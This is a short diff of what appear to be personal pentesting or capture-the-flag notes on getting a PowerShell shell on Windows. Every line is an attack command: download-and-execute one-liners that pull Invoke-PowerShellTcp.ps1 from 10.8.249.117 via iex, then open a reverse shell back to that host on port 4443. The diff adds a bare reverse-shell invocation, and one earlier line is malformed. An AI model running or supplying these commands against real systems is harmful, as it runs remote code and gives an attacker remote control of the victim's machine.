@@ -9,4 +9,6 @@ create powershell in windows
   powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.249.117/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -10.8.249.117  -Port 4443
   
   powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.249.117/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.249.117 -Port 4443
+  
+  Invoke-PowerShellTcp -Reverse -IPAddress 10.8.249.117 -Port 4443
  
